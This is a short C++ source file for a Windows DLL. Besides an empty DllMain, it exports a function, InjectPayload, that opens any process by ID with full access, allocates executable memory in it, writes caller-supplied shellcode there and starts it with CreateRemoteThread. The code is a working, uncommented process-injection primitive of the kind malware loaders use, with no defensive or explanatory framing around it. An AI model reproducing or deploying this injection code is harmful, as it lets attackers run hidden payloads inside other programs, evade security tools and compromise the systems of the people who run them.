// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

    extern "C" __declspec(dllexport) int InjectPayload(DWORD pid, unsigned char* payload, unsigned int length)
    {
        HANDLE hProcess;
        HANDLE hThread;
        PVOID remoteBuffer;

        hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
        if (!hProcess)
            return -1;

        remoteBuffer = VirtualAllocEx(hProcess, NULL, length, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if (!remoteBuffer) {
            CloseHandle(hProcess);
            return -2;
        }

        if (!WriteProcessMemory(hProcess, remoteBuffer, payload, length, NULL)) {
            CloseHandle(hProcess);
            return -3;
        }

        hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
        if (!hThread) {
            CloseHandle(hProcess);
            return -4;
        }

        CloseHandle(hThread);
        CloseHandle(hProcess);
        return 0;
    }

